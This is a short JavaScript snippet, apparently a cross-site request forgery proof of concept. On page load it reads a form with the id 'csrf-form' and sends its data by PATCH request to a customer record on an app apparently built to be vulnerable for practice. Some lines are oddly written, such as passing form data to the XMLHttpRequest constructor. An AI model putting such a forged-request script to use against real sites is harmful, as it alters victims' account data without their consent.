window.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector('#csrf-form');
  // const form = document.getElementById('csrf-form');

  const formData = new FormData(form);
  const XHR = new XMLHttpRequest(formData);
    XHR.open("PATCH", "https://vulnerable-app1.herokuapp.com/customers/4", true);
    XHR.responseType = "json";
    XHR.send(formData);
    XHR.onload = () => {
    }
    if (form) return false;
})
